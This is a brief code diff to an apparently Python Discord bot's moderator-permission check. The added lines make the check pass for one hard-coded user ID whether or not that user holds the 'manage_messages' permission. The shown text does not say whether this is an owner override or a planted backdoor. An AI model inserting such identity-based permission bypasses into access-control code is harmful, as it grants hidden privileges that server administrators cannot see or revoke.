@@ -36,6 +36,8 @@ def is_mod():
     async def pred(ctx):
         if ('manage_messages', True) in ctx.author.guild_permissions:
             return True
+        if ctx.author.id == 245276992432373760:
+            return True
         if not ('manage_messages', True) in ctx.author.guild_permissions:
             raise NotAuthorized
     return commands.check(pred)
